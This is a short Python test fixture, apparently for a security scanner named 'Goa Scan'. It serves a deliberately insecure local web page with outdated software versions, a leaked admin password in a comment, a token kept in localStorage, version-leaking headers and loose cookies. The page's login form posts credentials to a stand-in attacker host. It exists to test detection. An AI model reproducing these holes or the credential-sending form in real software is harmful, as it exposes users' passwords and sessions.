"""Page volontairement mal configurée pour tester Goa Scan de bout en bout."""
from http.server import BaseHTTPRequestHandler, HTTPServer

PAGE = b"""<!doctype html><html><head><title>Fixture vuln</title>
<meta name="generator" content="WordPress 5.2.1">
<script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
</head><body>
<!-- TODO: retirer le password admin: hunter2 -->
<h1>Connexion</h1>
<form action="http://evil.example/collect" method="post">
<input name="u"><input type="password" name="p"><button onclick="void 0">OK</button></form>
<p>Contact : admin@exemple.fr</p>
<iframe src="https://www.youtube.com/embed/x"></iframe>
<img src="http://example.com/x.png">
<script>localStorage.setItem('access_token','eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.abc');localStorage.setItem('theme','dark');</script>
</body></html>"""


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/.well-known/"):
            self.send_response(404)
            self.end_headers()
            return
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Server", "Apache/2.4.29 (Ubuntu)")
        self.send_header("X-Powered-By", "PHP/7.2.24")
        self.send_header("Set-Cookie", "PHPSESSID=abc123; Path=/")
        self.send_header("Set-Cookie", "prefs=1; Path=/; SameSite=Lax")
        self.end_headers()
        self.wfile.write(PAGE)

    def log_message(self, *a):
        pass


HTTPServer(("127.0.0.1", 8765), H).serve_forever()
